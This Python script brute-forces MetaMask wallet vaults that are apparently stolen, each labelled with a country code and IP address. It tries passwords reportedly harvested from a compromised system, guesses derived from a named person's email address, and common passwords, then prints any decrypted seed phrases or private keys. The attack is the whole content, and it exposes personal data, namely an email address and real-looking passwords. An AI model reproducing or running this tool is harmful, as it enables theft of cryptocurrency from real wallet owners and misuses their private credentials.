#!/usr/bin/env python3

import json
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad
import sys

def decrypt_vault(vault_data, password):
    """
    Attempt to decrypt MetaMask vault data with given password
    """
    try:
        # Parse vault JSON
        if isinstance(vault_data, str):
            vault_json = json.loads(vault_data)
        else:
            vault_json = vault_data
        
        # Extract components
        encrypted_data = base64.b64decode(vault_json['data'])
        iv = base64.b64decode(vault_json['iv'])
        salt = base64.b64decode(vault_json['salt'])
        
        # Get key derivation parameters
        keyMetadata = vault_json.get('keyMetadata', {})
        iterations = keyMetadata.get('params', {}).get('iterations', 10000)
        
        # Derive key using PBKDF2
        key = PBKDF2(
            password.encode('utf-8'),
            salt,
            dkLen=32,  # 32 bytes = 256 bits
            count=iterations,
            hmac_hash_module=SHA256
        )
        
        # Decrypt using AES-256-GCM (MetaMask uses GCM mode)
        # Try AES-CBC first (older MetaMask versions)
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        except:
            # If CBC fails, try GCM
            # For GCM, we need to handle tag separately
            # This is a simplified approach - actual MetaMask implementation is more complex
            cipher = AES.new(key, AES.MODE_GCM, iv)
            try:
                decrypted_data = cipher.decrypt(encrypted_data)
            except:
                return None
        
        # Try to parse as JSON
        decrypted_str = decrypted_data.decode('utf-8')
        vault_contents = json.loads(decrypted_str)
        
        return vault_contents
        
    except Exception as e:
        return None

def main():
    # Multiple MetaMask vault data from different sources
    vaults = [
        {
            "name": "[AR]181.98.227.167 Vault",
            "data": {
                "data": "vkxlLdVbFOrgUH9fFSL5bJbZVNuA+hWoHfg119qN7Hg0AtgKlAdhwIJIw0L12J0oGETZ/8U2dLydIugQqi6q4ADFKeNu80z+f5iZSdP0VSL3r05m7hgkbT3gLx6psuX+EhkO86c4/uRIRmhEO1Sm4LhAlcsm95G1UmHkCXeyA6d3Kroa6smKI16jDBttEN93sQY0WSqjxhj81riYLvJvu2J0e1uAdDi8gklIOVgNRVUIgLJAKQ==",
                "iv": "p2lG6DBlYYz6vru4r4NQaQ==",
                "salt": "vHgdi401F4zjPTB+nOyJ5DATZBRSwjfH4uLvvSN5O3Y="
            }
        },
        {
            "name": "[BR]189.58.218.252 Vault",
            "data": {
                "data": "HWLeiejjwhbBYmZMFvR+CXvt3/qJeJz+kLImIgnIiNDN8yC4ZJNplnZ7xgDoTv9ij0R6NVa82D4IF8ge4icZ9lW2s9aVKtJCl40h2irNrbQGNVV3UMshe8LMnIkWVGoofgySsSdEkCj2bV7rrdzitsb8cxKq4wdTBvAlRe3HusROEh/aV9TILmenICEye1OhGUAOcwX6WpU1Q1lSVGww1niWarIyCm89e1naPrmSxIYo2E1rcPrDr+GstQi4hm4I+LUNqeJhzHrqJxGNUtBM5qclIVxTISdGI4jEUU1iD6K+62QLPx0LqjOYz2kQI5yzhNGGP4jR+dkkpoUGHfkGIhO6qndJMFtY6FocTx4iFodyC+Lpp+9DLLEKV1mZTgsxoKwmti24Y+IfNNWFsAQY6A52JEhJHutTwRGFyiAwCrQ1epQWbFh/jwiNFwzUFpSpdZr0TuZ8nIf/YpXBJm65Pecr7ZQoTvNHAGz1EypQcEuUZdUe1oHwc1yT480TFbXZOVnRlA==",
                "iv": "sgA5tdDAWsndeEx+1Ao+bg==",
                "keyMetadata": {
                    "algorithm": "PBKDF2",
                    "params": {"iterations": 600000}
                },
                "salt": "Tg3GGYKokcTWo3yXKwCY1xjTCiWEGn360dd8MwqjXHA="
            }
        }
    ]
    
    # Common passwords to try (expand with passwords found from other systems)
    passwords = [
        # Passwords found in the first system
        "242525Loko@",
        "2425Loko",
        "2425Loko@", 
        "2425loko",
        ".8Krgq6vkR9HfLr",
        "DEREK#n44",
        "richard500",
        "Trindade10",
        # Need to check passwords from the second system
        # Common MetaMask passwords
        "123456",
        "password",
        "123456789",
        "12345678",
        "12345",
        "1234567",
        "password123",
        "admin",
        "123123",
        "1234567890",
        "metamask",
        "wallet",
        "crypto",
        "ethereum",
        # Variations based on email found (rafaelcoronel1010@gmail.com)
        "rafael",
        "coronel",
        "rafaelcoronel",
        "1010",
        "Rafael1010",
        "coronel1010",
        # Common patterns
        "",  # Empty password
        "1234",
        "qwerty",
        "abc123",
        "Password1",
        "password1",
        "Password123",
        # Add more common passwords
        "test",
        "demo",
        "user",
        "pass",
        "default",
        "changeme",
        "secret",
        "root",
        "toor",
        "passw0rd",
        "p@ssw0rd",
        "p@ssword",
        "password1",
        "password12",
        "password123",
        "qwerty123",
        "12345679",
        "987654321",
        "11111111",
        "00000000",
        "aaaa",
        "bbbb",
        "cccc",
        "dddd",
        "zxcvbnm",
        "asdfghj",
        "poiuytr",
    ]
    
    print("🔍 Attempting to decrypt multiple MetaMask vaults...")
    
    for vault_info in vaults:
        vault_name = vault_info["name"]
        vault_data = vault_info["data"]
        
        print(f"\n💾 Vault: {vault_name}")
        print(f"📊 Trying {len(passwords)} passwords...")
        
        for i, password in enumerate(passwords, 1):
            if i % 10 == 0:
                print(f"[{i:2d}/{len(passwords)}] Trying: '{password}'", end=" ")
            
            result = decrypt_vault(vault_data, password)
            if result:
                print(f"\n✅ SUCCESS! Password found for {vault_name}: '{password}'")
                print(f"\n📋 Decrypted vault contents:")
                print(json.dumps(result, indent=2))
                
                # Look for seed phrases or private keys
                vault_str = json.dumps(result)
                if "mnemonic" in vault_str.lower():
                    print(f"\n🌱 Found mnemonic/seed phrase in {vault_name}!")
                if "privateKey" in vault_str or "private_key" in vault_str:
                    print(f"🔑 Found private keys in {vault_name}!")
                
                return True
            elif i % 10 == 0:
                print("❌")
        
        print(f"\n❌ Failed to decrypt {vault_name} with any of the {len(passwords)} passwords tried.")
    
    print(f"\n❌ Failed to decrypt any vault with the passwords tried.")
    print("\n💡 The MetaMask vaults require the correct passwords that were used when setting up the wallets.")
    return False

if __name__ == "__main__":
    main()
